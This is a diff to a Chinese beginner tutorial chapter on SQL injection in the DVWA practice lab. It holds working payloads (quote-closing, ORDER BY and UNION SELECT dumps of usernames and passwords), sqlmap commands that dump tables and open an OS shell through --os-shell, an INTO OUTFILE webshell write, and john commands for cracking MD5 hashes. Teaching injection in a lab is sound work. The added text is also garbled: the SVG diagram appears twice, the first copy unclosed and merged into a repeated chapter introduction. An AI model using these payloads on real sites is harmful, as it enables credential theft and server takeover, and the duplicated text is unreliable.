@@ -33,6 +33,254 @@ SQL注入就是这么回事儿！你输入的内容里夹带了"私货"，数据
 
 当然现实中的银行柜员不会这么傻，但很多网站的"数据库管理员"（程序员写的代码）还真就这么傻！
 
+### 📍 先看你该访问哪个 URL（三选一）
+
+**本章靶场模块：SQL Injection（用户 ID 查询那个，带 `?id=` 参数）** 和 **SQL Injection (Blind)（盲注）**。Kali 同学最香：直接 sqlmap 一把梭，不用手算！
+
+| 搭建方式 | SQLi 显注页面地址 | SQLi (Blind) 盲注页面地址 | 攻击机首选工具（Kali 自带全了 🔥）|
+|---|---|---|---|
+| 🪟 Windows PHPStudy | `http://localhost/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit` | `http://localhost/dvwa/vulnerabilities/sqli_blind/?id=1&Submit=Submit` | Burp Suite 手动注入 |
+| 🐧 **Kali LAMP ✅** | `http://你的KaliIP/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit` | `http://你的KaliIP/dvwa/vulnerabilities/sqli_blind/?id=1&Submit=Submit` | **sqlmap 全自动** + Burp Suite 手注学原理 + MySQL 客户端直连练手 |
+| 🐳 Docker 版 | `http://你的KaliIP:4280/vulnerabilities/sqli/?id=1` | `http://你的KaliIP:4280/vulnerabilities/sqli_blind/?id=1` | 同 Kali；sqlmap 抓 cookie 直接梭（⚠️ Docker pull 拉不动？直接换 ch04 §4.5 Kali LAMP 或 §4.7 XAMPP ✅）|
+
+<svg viewBox="0 0 1100 480" width="100%" xmlns="http://www.w3.org/2000/svg" style="width:100%;max-width:980px;margin:18px auto;display:block;border:1px solid #2a2a3a;border-radius:14px;background:#0f1120;">
+
+  <defs><linearGradient id="sq1" x1="0" y1="0" x2="1" y2="1"><stop offset="0%" stop-color="#ff7b72"/><stop offset="100%" stop-color="#8d1515"/></linearGradient><linearGradient id="sq2" x1="0" y1="0" x2="1" y2="1"><stop offset="0%" stop-color="#1f6feb"/><stop offset="100%" stop-color="#0b3b8a"/></linearGradient><linearGradient id="sq3" x1="0" y1="0" x2="1" y2="1"><stop offset="0%" stop-color="#238636"/><stop offset="100%" stop-color="#0a3716"/></linearGradient><marker id="sqr" markerWidth="10" markerHeight="10" refX="9" refY="3" orient="auto"><path d="M0,0 L0,6 L9,3 z" fill="#ff7b72"/></marker><marker id="sqg" markerWidth="10" markerHeight="10" refX="9" refY="3" orient="auto"><path d="M0,0 L0,6 L9,3 z" fill="#3fb950"/></marker></defs>
+  <text x="550" y="32" text-anchor="middle" fill="#fff" font-size="20" font-weight="bold" font-family="Arial">图 10-1  SQL 注入 "8 步剥洋葱法" 全景 + Kali sqlmap 一键剥流程图解</text>
+  <!-- 左：浏览器/Kali sqlmap 攻击端 -->
+  <rect x="16" y="60" width="238" height="402" rx="14" fill="url(#sq1)" stroke="#ff7b72" stroke-width="1.4"/>
+  <text x="135" y="92" text-anchor="middle" fill="#fff" font-family="Arial" font-weight="bold" font-size="15">🎯  攻击端 Kali（浏览器手注 + sqlmap 一键梭）</text>
+  <g font-family="Arial" font-size="11.2" fill="#ffeaea">
+    <text x="30" y="126" font-weight="bold" fill="#ffd089">👆 手动注入 8 步剥洋葱法（一定要先过脑子练一遍 👇）</text>
+    <g font-family="Consolas,monospace" font-size="11">
+      <rect x="30" y="136" width="210" height="22" rx="5" fill="#000" opacity="0.35"/><text x="42" y="152">1 . ?id=1 and 1=1   正常      ← 判断注入点类型</text>
+      <rect x="30" y="162" width="210" height="22" rx="5" fill="#000" opacity="0.35"/><text x="42" y="178">2 . ?id=1 and 1=2   无数据    ← ✅ 显注成立！</text>
+      <rect x="30" y="188" width="210" height="22" rx="5" fill="#000" opacity="0.35"/><text x="42" y="204">3 . order by 1/2/3…         ← 判断字段数（DVWA=2列）</text>
+      <rect x="30" y="214" width="210" height="22" rx="5" fill="#000" opacity="0.35"/><text x="42" y="230">4 . id=-1 union select 1,2   ← 定位显示位 1/2</text>
+      <rect x="30" y="240" width="210" height="22" rx="5" fill="#000" opacity="0.35"/><text x="42" y="256">5 . version()/user()/database()  ← 拿 db/dvwa 元信息</text>
+      <rect x="30" y="266" width="210" height="22" rx="5" fill="#000" opacity="0.35"/><text x="42" y="282">6 . information_schema.tables  ← 爆表：users/guestbook</text>
+      <rect x="30" y="292" width="210" height="22" rx="5" fill="#000" opacity="0.35"/><text x="42" y="308">7 . information_schema.columns ← 爆字段 user/password</text>
+      <rect x="30" y="318" width="210" height="22" rx="5" fill="#000" opacity="0.35"/><text x="42" y="334">8 . group_concat(user,0x3a,password)  ← 一锅端 MD5 💥</text>
+    </g>
+    <text x="30" y="372" font-weight="bold" fill="#c7a6ff">👇 不想手算？Kali sqlmap 一键跑完 8 步（懒人福音 🔥）</text>
+    <rect x="30" y="382" width="210" height="58" rx="6" fill="#000" opacity="0.5"/>
+    <text x="42" y="402" font-family="Consolas,monospace" fill="#79c0ff">sqlmap -u "http://KALI/dvwa/vuln/sqli/?id=1"</text>
+    <text x="42" y="418" font-family="Consolas,monospace" fill="#79c0ff">  --cookie="PHPSESSID=xxx;security=low"</text>
+    <text x="42" y="434" font-family="Consolas,monospace" fill="#79c0ff">  --batch --dbs  --dump -D dvwa -T users</text>
+  </g>
+  <line x1="254" y1="180" x2="278" y2="180" stroke="#ff7b72" stroke-width="2" marker-end="url(#sqr)"/>
+  <line x1="254" y1="300" x2="278" y2="300" stroke="#ff7b72" stroke-width="2" marker-end="url(#sqr)"/>
+  <line x1="254" y1="410" x2="278" y2="410" stroke="#ff7b72" stroke-width="2" marker-end="url(#sqr)"/>
+  <!-- 中间：DVWA 后端拼接漏洞代码 -->
+  <rect x="278" y="60" width="546" height="402" rx="14" fill="#10173a" stroke="#4490ff" stroke-width="1.2"/>
+  <text x="551" y="92" text-anchor="middle" fill="#fff" font-family="Arial" font-weight="bold" font-size="16">🧠  DVWA /vulnerabilities/sqli/source/low.php（漏洞根源 👇）</text>
+  <g font-family="Consolas,monospace" font-size="11.5" fill="#fff">
+    <rect x="296" y="108" width="510" height="80" rx="6" fill="#000" opacity="0.6"/>
+    <text x="310" y="130" fill="#ff80a0">$id = $_REQUEST[ 'id' ];</text>
+    <text x="310" y="150" fill="#c7a6ff">// ⚠ LOW：没做任何检查、没转义、没参数化！</text>
+    <text x="310" y="170" fill="#9de8b0">$query  = "SELECT first_name, last_name FROM users WHERE user_id = '$id';";  ← 单引号可逃！💥</text>
+    <text x="310" y="190" fill="#ffe16b">$result = mysqli_query($GLOBALS["___mysqli_ston"], $query ) or die( mysqli_connect_error() );</text>
+    <text x="551" y="218" text-anchor="middle" fill="#ffd089" font-family="Arial" font-weight="bold" font-size="13">📌  四档防护对比（SQLi 各档差异最典型！）</text>
+    <g font-family="Arial" font-size="10.5">
+      <rect x="296" y="230" width="122" height="104" rx="6" fill="#3bff9a18" stroke="#3bff9a"/>
+      <text x="357" y="252" text-anchor="middle" font-weight="bold" fill="#3bff9a" font-size="13">LOW 🌱</text><text x="306" y="272">· 直接把 $id 拼进 SQL</text><text x="306" y="288">· die 爆出 SQL 语法错</text><text x="306" y="304">· 显注/报错/堆叠全吃</text><text x="306" y="320">· 手注 8 步或 sqlmap 秒</text>
+      <rect x="430" y="230" width="122" height="104" rx="6" fill="#ffe16b18" stroke="#ffe16b"/>
+      <text x="491" y="252" text-anchor="middle" font-weight="bold" fill="#ffe16b" font-size="13">MED 🌿</text><text x="440" y="272">· mysql_real_escape_string</text><text x="440" y="288">· 转义单引号等</text><text x="440" y="304">· 但无 set charset GBK</text><text x="440" y="320">· %df%27 宽字节绕过！</text>
+      <rect x="564" y="230" width="122" height="104" rx="6" fill="#ffa36b18" stroke="#ffa36b"/>
+      <text x="625" y="252" text-anchor="middle" font-weight="bold" fill="#ffa36b" font-size="13">HIGH 🌳</text><text x="574" y="272">· 加 LIMIT 1 取一行</text><text x="574" y="288">· 不回显错误信息</text><text x="574" y="304">· 但照样有注入点</text><text x="574" y="320">· 盲注：布尔/时间/报错</text>
+      <rect x="698" y="230" width="106" height="104" rx="6" fill="#ff6b8a18" stroke="#ff6b8a"/>
+      <text x="751" y="252" text-anchor="middle" font-weight="bold" fill="#ff6b8a" font-size="13">IMPOSS</text><text x="708" y="272">· PDO 预处理</text><text x="708" y="288">· 预编译参数绑定</text><text x="708" y="304">· $id = (int)$id 强转</text><text x="708" y="320">· 白名单 LIMIT + Token</text>
+    </g>
+    <text x="551" y="354" text-anchor="middle" fill="#9de8b0" font-family="Arial" font-weight="bold" font-size="13">💡 真正安全：**PDO 参数化 + (int)强转 + 白名单列名**，任何拼接都可以丢了！</text>
+    <rect x="296" y="370" width="510" height="74" rx="6" fill="#000" opacity="0.5"/>
+    <text x="551" y="390" text-anchor="middle" fill="#fff" font-family="Arial" font-size="12">👆 注入后 SQL 语句实际变成了啥？（单引号逃逸 灵魂一步）</text>
+    <text x="310" y="414" fill="#ff80a0">SELECT first, last FROM users WHERE user_id='1'  &lt;text fill="#ffe16b"&gt;UNION SELECT 1, group_concat(user,':',password) FROM users -- </text>'</text>
+    <text x="551" y="434" text-anchor="middle" fill="#ffd089" font-weight="bold" font-size="13">↑↑↑  后半段单引号被注释 -- 吃掉，整句合成一条合法 SQL，连用户+密码一起吐出来！😈</text>
+  </g>
+  <!-- 右：数据库爆库结果 + 密码 MD5 去 cmd5 / john 破解 -->
+  <g>
+    <rect x="842" y="60" width="242" height="402" rx="14" fill="url(#sq3)" stroke="#2ea043" stroke-width="1.4"/>
+    <text x="963" y="92" text-anchor="middle" fill="#fff" font-family="Arial" font-weight="bold" font-size="15">💾  MySQL dvwa 库 · 爆出来的 users 表 5 条账密 + 破解（Kali 上 john/hash-identifier）</text>
+    <g font-family="Consolas,monospace" font-size="11" fill="#dffbe6">
+      <rect x="858" y="110" width="210" height="110" rx="6" fill="#000" opacity="0.55"/>
+      <text x="872" y="128" fill="#9de8b0" font-family="Arial" font-weight="bold">users 表（sqlmap --dump 出来的）</text>
+      <text x="872" y="146">id &#124; user     &#124; password MD5</text>
+      <text x="872" y="162"> 1 &#124; admin    &#124; 5f4dcc3b5aa765d61d8327deb882cf99</text>
+      <text x="872" y="178"> 2 &#124; gordonb  &#124; e99a18c428cb38d5f260853678922e03</text>
+      <text x="872" y="194"> 3 &#124; 1337     &#124; 8d3533d75ae2c3966d7e0d4fcc69216b</text>
+      <text x="872" y="210"> 4 &#124; pablo    &#124; 0d10707ea0e203a0e2f7fe5c1e3afd40</text>
+      <text x="872" y="226"> 5 &#124; smithy   &#124; cb92c52a60d2b4b50c976e94e2171a0c</text>
+      <rect x="858" y="234" width="210" height="70" rx="6" fill="#000" opacity="0.55"/>
+      <text x="872" y="254" fill="#ffd089" font-family="Arial" font-weight="bold">🛠️ Kali 本地一键破 MD5：</text>
+      <text x="872" y="272"># 格式：用户名:md5 → hash.txt</text>
+      <text x="872" y="288"># john --format=raw-md5 hash.txt</text>
+      <text x="872" y="304"># admin:password / gordonb:abc123 ✅</text>
+      <rect x="858" y="320" width="210" height="52" rx="6" fill="#000" opacity="0.55"/>
+      <text x="872" y="340" fill="#c7a6ff" font-family="Arial" font-weight="bold">🎁 盲注/布尔注 交给 sqlmap：</text>
+      <text x="872" y="358">sqlmap -u ".../sqli_blind?id=1" --cookie=...</text>
+      <text x="872" y="374">  --technique=BT --threads 10 --batch --dump</text>
+      <rect x="858" y="388" width="210" height="64" rx="6" fill="#000" opacity="0.55"/>
+      <text x="872" y="408" fill="#79c0ff" font-family="Arial" font-weight="bold">✅ 最后战果 4 件套 🔓：</text>
+      <text x="872" y="426">① 5 条账密 ② 整库结构 ③ 当前库权限 ④ 可能直接 FILES privilege 导出 getshell！</text>
+      <text x="872" y="444">into outfile '/var/www/html/dvwa/s.php' 一句话  → 直接变成上传漏洞！</text>
+    </g>
+  </g>
+# 第10章 DVWA实战 - SQL注入入门 🎯
+
+## 开篇引入：SQL注入是什么？🤔
+
+哈喽，各位新手小伙伴们！欢迎来到第10章的学习！今天我们要聊的话题，可以说是Web安全界的"老牌明星"——**SQL注入**。这玩意儿从上个世纪末就开始火了，到了2026年依然是OWASP Top 10的常客，足以说明它的重要性！
+
+### 先讲个生活小例子 🏪
+
+你有没有去过那种老式的图书馆？图书馆里有个管理员，你告诉管理员书名，他就去帮你找书。
+
+正常流程是这样的：
+- 你说："帮我找《西游记》"
+- 管理员重复一遍："好的，我去书架找《西游记》"
+- 然后他就把书给你拿来了 ✅
+
+但是呢，如果你是个"坏孩子"，你跟管理员说：
+> "帮我找《西游记》，顺便把所有书架上的书都给我抱出来"
+
+如果管理员脑子不太好使，真的把你说的话原封不动地当成命令执行了...那后果就严重了！他不仅给你找了《西游记》，还把整个图书馆的书都搬出来了！😱
+
+SQL注入就是这么回事儿！你输入的内容里夹带了"私货"，数据库没分清哪些是数据、哪些是命令，稀里糊涂就把你的"私货"也当成代码执行了。
+
+### 再举个更贴近生活的例子 📝
+
+假设你去银行取钱，你跟柜员说：
+- "我要取100块钱"
+- 柜员操作：取100块 → 给你钱
+
+但是如果你说：
+- "我要取100块钱，顺便把我账户里的钱都改成9999999"
+
+如果柜员真照做了...那银行不就亏大了？🤣
+
+当然现实中的银行柜员不会这么傻，但很多网站的"数据库管理员"（程序员写的代码）还真就这么傻！
+
+### 📍 先看你该访问哪个 URL（三选一）
+
+**本章靶场模块：SQL Injection（用户 ID 查询那个，带 `?id=` 参数）** 和 **SQL Injection (Blind)（盲注）**。Kali 同学最香：直接 sqlmap 一把梭，不用手算！
+
+| 搭建方式 | SQLi 显注页面地址 | SQLi (Blind) 盲注页面地址 | 攻击机首选工具（Kali 自带全了 🔥）|
+|---|---|---|---|
+| 🪟 Windows PHPStudy | `http://localhost/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit` | `http://localhost/dvwa/vulnerabilities/sqli_blind/?id=1&Submit=Submit` | Burp Suite 手动注入 |
+| 🐧 **Kali LAMP ✅** | `http://你的KaliIP/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit` | `http://你的KaliIP/dvwa/vulnerabilities/sqli_blind/?id=1&Submit=Submit` | **sqlmap 全自动** + Burp Suite 手注学原理 + MySQL 客户端直连练手 |
+| 🐳 Docker 版 | `http://你的KaliIP:4280/vulnerabilities/sqli/?id=1` | `http://你的KaliIP:4280/vulnerabilities/sqli_blind/?id=1` | 同 Kali；sqlmap 抓 cookie 直接梭（⚠️ Docker pull 拉不动？直接换 ch04 §4.5 Kali LAMP 或 §4.7 XAMPP ✅）|
+
+<svg viewBox="0 0 1100 480" width="100%" xmlns="http://www.w3.org/2000/svg" style="width:100%;max-width:980px;margin:18px auto;display:block;border:1px solid #2a2a3a;border-radius:14px;background:#0f1120;">
+
+  <defs><linearGradient id="sq1" x1="0" y1="0" x2="1" y2="1"><stop offset="0%" stop-color="#ff7b72"/><stop offset="100%" stop-color="#8d1515"/></linearGradient><linearGradient id="sq2" x1="0" y1="0" x2="1" y2="1"><stop offset="0%" stop-color="#1f6feb"/><stop offset="100%" stop-color="#0b3b8a"/></linearGradient><linearGradient id="sq3" x1="0" y1="0" x2="1" y2="1"><stop offset="0%" stop-color="#238636"/><stop offset="100%" stop-color="#0a3716"/></linearGradient><marker id="sqr" markerWidth="10" markerHeight="10" refX="9" refY="3" orient="auto"><path d="M0,0 L0,6 L9,3 z" fill="#ff7b72"/></marker><marker id="sqg" markerWidth="10" markerHeight="10" refX="9" refY="3" orient="auto"><path d="M0,0 L0,6 L9,3 z" fill="#3fb950"/></marker></defs>
+  <text x="550" y="32" text-anchor="middle" fill="#fff" font-size="20" font-weight="bold" font-family="Arial">图 10-1  SQL 注入 "8 步剥洋葱法" 全景 + Kali sqlmap 一键剥流程图解</text>
+  <!-- 左：浏览器/Kali sqlmap 攻击端 -->
+  <rect x="16" y="60" width="238" height="402" rx="14" fill="url(#sq1)" stroke="#ff7b72" stroke-width="1.4"/>
+  <text x="135" y="92" text-anchor="middle" fill="#fff" font-family="Arial" font-weight="bold" font-size="15">🎯  攻击端 Kali（浏览器手注 + sqlmap 一键梭）</text>
+  <g font-family="Arial" font-size="11.2" fill="#ffeaea">
+    <text x="30" y="126" font-weight="bold" fill="#ffd089">👆 手动注入 8 步剥洋葱法（一定要先过脑子练一遍 👇）</text>
+    <g font-family="Consolas,monospace" font-size="11">
+      <rect x="30" y="136" width="210" height="22" rx="5" fill="#000" opacity="0.35"/><text x="42" y="152">1 . ?id=1 and 1=1   正常      ← 判断注入点类型</text>
+      <rect x="30" y="162" width="210" height="22" rx="5" fill="#000" opacity="0.35"/><text x="42" y="178">2 . ?id=1 and 1=2   无数据    ← ✅ 显注成立！</text>
+      <rect x="30" y="188" width="210" height="22" rx="5" fill="#000" opacity="0.35"/><text x="42" y="204">3 . order by 1/2/3…         ← 判断字段数（DVWA=2列）</text>
+      <rect x="30" y="214" width="210" height="22" rx="5" fill="#000" opacity="0.35"/><text x="42" y="230">4 . id=-1 union select 1,2   ← 定位显示位 1/2</text>
+      <rect x="30" y="240" width="210" height="22" rx="5" fill="#000" opacity="0.35"/><text x="42" y="256">5 . version()/user()/database()  ← 拿 db/dvwa 元信息</text>
+      <rect x="30" y="266" width="210" height="22" rx="5" fill="#000" opacity="0.35"/><text x="42" y="282">6 . information_schema.tables  ← 爆表：users/guestbook</text>
+      <rect x="30" y="292" width="210" height="22" rx="5" fill="#000" opacity="0.35"/><text x="42" y="308">7 . information_schema.columns ← 爆字段 user/password</text>
+      <rect x="30" y="318" width="210" height="22" rx="5" fill="#000" opacity="0.35"/><text x="42" y="334">8 . group_concat(user,0x3a,password)  ← 一锅端 MD5 💥</text>
+    </g>
+    <text x="30" y="372" font-weight="bold" fill="#c7a6ff">👇 不想手算？Kali sqlmap 一键跑完 8 步（懒人福音 🔥）</text>
+    <rect x="30" y="382" width="210" height="58" rx="6" fill="#000" opacity="0.5"/>
+    <text x="42" y="402" font-family="Consolas,monospace" fill="#79c0ff">sqlmap -u "http://KALI/dvwa/vuln/sqli/?id=1"</text>
+    <text x="42" y="418" font-family="Consolas,monospace" fill="#79c0ff">  --cookie="PHPSESSID=xxx;security=low"</text>
+    <text x="42" y="434" font-family="Consolas,monospace" fill="#79c0ff">  --batch --dbs  --dump -D dvwa -T users</text>
+  </g>
+  <line x1="254" y1="180" x2="278" y2="180" stroke="#ff7b72" stroke-width="2" marker-end="url(#sqr)"/>
+  <line x1="254" y1="300" x2="278" y2="300" stroke="#ff7b72" stroke-width="2" marker-end="url(#sqr)"/>
+  <line x1="254" y1="410" x2="278" y2="410" stroke="#ff7b72" stroke-width="2" marker-end="url(#sqr)"/>
+  <!-- 中间：DVWA 后端拼接漏洞代码 -->
+  <rect x="278" y="60" width="546" height="402" rx="14" fill="#10173a" stroke="#4490ff" stroke-width="1.2"/>
+  <text x="551" y="92" text-anchor="middle" fill="#fff" font-family="Arial" font-weight="bold" font-size="16">🧠  DVWA /vulnerabilities/sqli/source/low.php（漏洞根源 👇）</text>
+  <g font-family="Consolas,monospace" font-size="11.5" fill="#fff">
+    <rect x="296" y="108" width="510" height="80" rx="6" fill="#000" opacity="0.6"/>
+    <text x="310" y="130" fill="#ff80a0">$id = $_REQUEST[ 'id' ];</text>
+    <text x="310" y="150" fill="#c7a6ff">// ⚠ LOW：没做任何检查、没转义、没参数化！</text>
+    <text x="310" y="170" fill="#9de8b0">$query  = "SELECT first_name, last_name FROM users WHERE user_id = '$id';";  ← 单引号可逃！💥</text>
+    <text x="310" y="190" fill="#ffe16b">$result = mysqli_query($GLOBALS["___mysqli_ston"], $query ) or die( mysqli_connect_error() );</text>
+    <text x="551" y="218" text-anchor="middle" fill="#ffd089" font-family="Arial" font-weight="bold" font-size="13">📌  四档防护对比（SQLi 各档差异最典型！）</text>
+    <g font-family="Arial" font-size="10.5">
+      <rect x="296" y="230" width="122" height="104" rx="6" fill="#3bff9a18" stroke="#3bff9a"/>
+      <text x="357" y="252" text-anchor="middle" font-weight="bold" fill="#3bff9a" font-size="13">LOW 🌱</text><text x="306" y="272">· 直接把 $id 拼进 SQL</text><text x="306" y="288">· die 爆出 SQL 语法错</text><text x="306" y="304">· 显注/报错/堆叠全吃</text><text x="306" y="320">· 手注 8 步或 sqlmap 秒</text>
+      <rect x="430" y="230" width="122" height="104" rx="6" fill="#ffe16b18" stroke="#ffe16b"/>
+      <text x="491" y="252" text-anchor="middle" font-weight="bold" fill="#ffe16b" font-size="13">MED 🌿</text><text x="440" y="272">· mysql_real_escape_string</text><text x="440" y="288">· 转义单引号等</text><text x="440" y="304">· 但无 set charset GBK</text><text x="440" y="320">· %df%27 宽字节绕过！</text>
+      <rect x="564" y="230" width="122" height="104" rx="6" fill="#ffa36b18" stroke="#ffa36b"/>
+      <text x="625" y="252" text-anchor="middle" font-weight="bold" fill="#ffa36b" font-size="13">HIGH 🌳</text><text x="574" y="272">· 加 LIMIT 1 取一行</text><text x="574" y="288">· 不回显错误信息</text><text x="574" y="304">· 但照样有注入点</text><text x="574" y="320">· 盲注：布尔/时间/报错</text>
+      <rect x="698" y="230" width="106" height="104" rx="6" fill="#ff6b8a18" stroke="#ff6b8a"/>
+      <text x="751" y="252" text-anchor="middle" font-weight="bold" fill="#ff6b8a" font-size="13">IMPOSS</text><text x="708" y="272">· PDO 预处理</text><text x="708" y="288">· 预编译参数绑定</text><text x="708" y="304">· $id = (int)$id 强转</text><text x="708" y="320">· 白名单 LIMIT + Token</text>
+    </g>
+    <text x="551" y="354" text-anchor="middle" fill="#9de8b0" font-family="Arial" font-weight="bold" font-size="13">💡 真正安全：**PDO 参数化 + (int)强转 + 白名单列名**，任何拼接都可以丢了！</text>
+    <rect x="296" y="370" width="510" height="74" rx="6" fill="#000" opacity="0.5"/>
+    <text x="551" y="390" text-anchor="middle" fill="#fff" font-family="Arial" font-size="12">👆 注入后 SQL 语句实际变成了啥？（单引号逃逸 灵魂一步）</text>
+    <text x="310" y="414" fill="#ff80a0">SELECT first, last FROM users WHERE user_id='1'  &lt;text fill="#ffe16b"&gt;UNION SELECT 1, group_concat(user,':',password) FROM users -- </text>'</text>
+    <text x="551" y="434" text-anchor="middle" fill="#ffd089" font-weight="bold" font-size="13">↑↑↑  后半段单引号被注释 -- 吃掉，整句合成一条合法 SQL，连用户+密码一起吐出来！😈</text>
+  </g>
+  <!-- 右：数据库爆库结果 + 密码 MD5 去 cmd5 / john 破解 -->
+  <g>
+    <rect x="842" y="60" width="242" height="402" rx="14" fill="url(#sq3)" stroke="#2ea043" stroke-width="1.4"/>
+    <text x="963" y="92" text-anchor="middle" fill="#fff" font-family="Arial" font-weight="bold" font-size="15">💾  MySQL dvwa 库 · 爆出来的 users 表 5 条账密 + 破解（Kali 上 john/hash-identifier）</text>
+    <g font-family="Consolas,monospace" font-size="11" fill="#dffbe6">
+      <rect x="858" y="110" width="210" height="110" rx="6" fill="#000" opacity="0.55"/>
+      <text x="872" y="128" fill="#9de8b0" font-family="Arial" font-weight="bold">users 表（sqlmap --dump 出来的）</text>
+      <text x="872" y="146">id &#124; user     &#124; password MD5</text>
+      <text x="872" y="162"> 1 &#124; admin    &#124; 5f4dcc3b5aa765d61d8327deb882cf99</text>
+      <text x="872" y="178"> 2 &#124; gordonb  &#124; e99a18c428cb38d5f260853678922e03</text>
+      <text x="872" y="194"> 3 &#124; 1337     &#124; 8d3533d75ae2c3966d7e0d4fcc69216b</text>
+      <text x="872" y="210"> 4 &#124; pablo    &#124; 0d10707ea0e203a0e2f7fe5c1e3afd40</text>
+      <text x="872" y="226"> 5 &#124; smithy   &#124; cb92c52a60d2b4b50c976e94e2171a0c</text>
+      <rect x="858" y="234" width="210" height="70" rx="6" fill="#000" opacity="0.55"/>
+      <text x="872" y="254" fill="#ffd089" font-family="Arial" font-weight="bold">🛠️ Kali 本地一键破 MD5：</text>
+      <text x="872" y="272"># 格式：用户名:md5 → hash.txt</text>
+      <text x="872" y="288"># john --format=raw-md5 hash.txt</text>
+      <text x="872" y="304"># admin:password / gordonb:abc123 ✅</text>
+      <rect x="858" y="320" width="210" height="52" rx="6" fill="#000" opacity="0.55"/>
+      <text x="872" y="340" fill="#c7a6ff" font-family="Arial" font-weight="bold">🎁 盲注/布尔注 交给 sqlmap：</text>
+      <text x="872" y="358">sqlmap -u ".../sqli_blind?id=1" --cookie=...</text>
+      <text x="872" y="374">  --technique=BT --threads 10 --batch --dump</text>
+      <rect x="858" y="388" width="210" height="64" rx="6" fill="#000" opacity="0.55"/>
+      <text x="872" y="408" fill="#79c0ff" font-family="Arial" font-weight="bold">✅ 最后战果 4 件套 🔓：</text>
+      <text x="872" y="426">① 5 条账密 ② 整库结构 ③ 当前库权限 ④ 可能直接 FILES privilege 导出 getshell！</text>
+      <text x="872" y="444">into outfile '/var/www/html/dvwa/s.php' 一句话  → 直接变成上传漏洞！</text>
+    </g>
+  </g>
+</svg>
+
+> 🔥 **Kali 同学本章 sqlmap 速查 5 条（复制 cookie 改 IP 就能跑）：**
+> ```bash
+> # 先登录 DVWA → Firefox F12 → 存储 → Cookie → 复制 PHPSESSID
+>
+> # 1. 检测注入点 + 自动脱 Low 级别 users 表（核心一条足够！）
+> sqlmap -u "http://192.168.42.135/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit" \
+>   --cookie="PHPSESSID=替换成你的PHPSESSID; security=low" \
+>   --batch --dbs -D dvwa -T users -C user_id,first_name,last_name,user,password --dump
+>
+> # 2. MEDIUM 级别（POST 方式提交 id；Burp 抓包看格式：id=1&Submit=Submit）
+> sqlmap -u "http://192.168.42.135/dvwa/vulnerabilities/sqli/" --method POST \
+>   --data="id=1&Submit=Submit" --cookie="PHPSESSID=xxx; security=medium" --batch --dump
+>
+> # 3. HIGH / Blind 盲注：Boolean + 时间 + 报错三板斧
+> sqlmap -u "http://192.168.42.135/dvwa/vulnerabilities/sqli_blind/?id=1&Submit=Submit" \
+>   --cookie="PHPSESSID=xxx; security=high" --technique=BEST --threads=8 --batch --risk 3 --dump
+>
+> # 4. Kali 本地把 dump 出来的 MD5 批量破（john 自带 wordlist）
+> echo "5f4dcc3b5aa765d61d8327deb882cf99" > /tmp/md5.txt
+> john --format=raw-md5 --wordlist=/usr/share/wordlists/rockyou.txt /tmp/md5.txt
+> john --show /tmp/md5.txt
+>
+> # 5. 想一把梭：一键 --os-shell 拿交互式命令行（MySQL FILE 权限 + secure_file_priv 没开才有戏）
+> sqlmap -u "http://192.168.42.135/dvwa/vulnerabilities/sqli/?id=1" \
+>   --cookie="PHPSESSID=xxx; security=low" --batch --os-shell   # 选 4 PHP Generic
+> ```
+
 ---
 
 ## SQL是什么？简单科普一下 📚
@@ -536,6 +784,22 @@ $result = mysql_query( $query ) or die( '<pre>' . mysql_error() . '</pre>' );
 ```
 出错了直接把MySQL的错误信息显示出来，这等于给攻击者送情报啊！
 
+### ✅ 表 10-1 · Low 级别通关速查 & 失败对照表（字符型注入 单引号闭合 + ORDER BY + UNION SELECT 完整 6 步）
+
+Low 级 SQLi 源码是：`$query = "SELECT first_name, last_name FROM users WHERE user_id = '$id';";` → 注意 `$id` 被**一对单引号**包住了！注入点是**字符型，闭合用单引号**。90% 新手卡在 "我写的 payload 为什么没反应"= 注释用错 / 没闭合单引号。下面 6 步 100% 过：
+
+| 步骤 | 做什么 | 输入框 id 里填什么（**逐字抄！空格不能省！**） | 看到什么算成功 ✅ | **失败了怎么办？（按报错抄作业）** ❌ |
+|---|---|---|---|---|
+| 0 | 切难度 + 进对模块 + 验证 SQLi 页面能工作 | 切 low → Submit → 左边点 **SQL Injection** → 默认输入 `1` 提交 | 返回 ID: 1 / First name: admin / Surname: admin（正常） | 【左边没有 SQL Injection 菜单】→ DVWA 没正确初始化。回 setup.php 点 Create/Reset DB |
+| 1 | **第一步，先找注入类型：闭合 + 报错法判断注入点** | 填：`1'`（数字 1 后面跟一个英文单引号）→ Submit | 出现**红色 MySQL 报错**（类似：`You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '''') LIMIT 1' at line 1`）= Low 真的是字符型单引号闭合，确认是 SQL 注入漏洞 ✅ | 【没报错 / 返回正常】→ ① 你输入的是中文引号！必须是英文输入法的单引号 `'`！键盘 L 右边第二个键；② 难度没切到 Low！重切 + 清缓存；③ 有的 DVWA 新版本 MySQL 不回显错误，那改填 `1' or '1'='1` 测试（如果出来多条数据 = 成功） |
+| 2 | **第二步，验证万能密码式 payload（先证明注入是对的）** | 填：`1' OR '1'='1`（OR 前后空格必须有，最后一个 '1'='1 刚好闭合源码里后面那只单引号，不需要注释） | 返回所有用户列表（5 条以上：admin, Gordon Brown, ...1337）= 注入成功 ✅ | 【只返回 1 条 admin / MySQL 报错】→ 99% 是你**空格错了或引号错了**。经典错：`1'or'1'='1`（OR 前后没空格，有的老 MySQL 会解析成 or1 报错）→ 必须 `1' OR '1'='1` 空格分开 |
+| 3 | **第三步，用 ORDER BY 猜这个 SELECT 一共查了几列（UNION 的前提！）** | 填：`1' ORDER BY 1 -- -`（-- 后面加空格加随便一个字符 ` -` 是因为有的 SQL 模式要求注释 -- 后面必须接空白字符）→ Submit；→ 再试 `1' ORDER BY 2 -- -` → `1' ORDER BY 3 -- -` | ORDER BY 1/2 都不报错（返回正常数据），ORDER BY 3 报错（Unknown column '3' in 'order clause'）= **当前 SELECT 是 2 列！** 🔥 | 【ORDER BY 3 也不报错 / 全都没区别】→ ① 注释符没生效！你用了 `--+` 但 + 没被 URL 编码成空格（有的直接输入框 + 就是加号不是空格）→ 换成 `-- x` 或 `#` 结尾；② 列数其实 >=4，继续试 ORDER BY 4 ORDER BY 5 直到报错为止，报错列数减一就是真列数 |
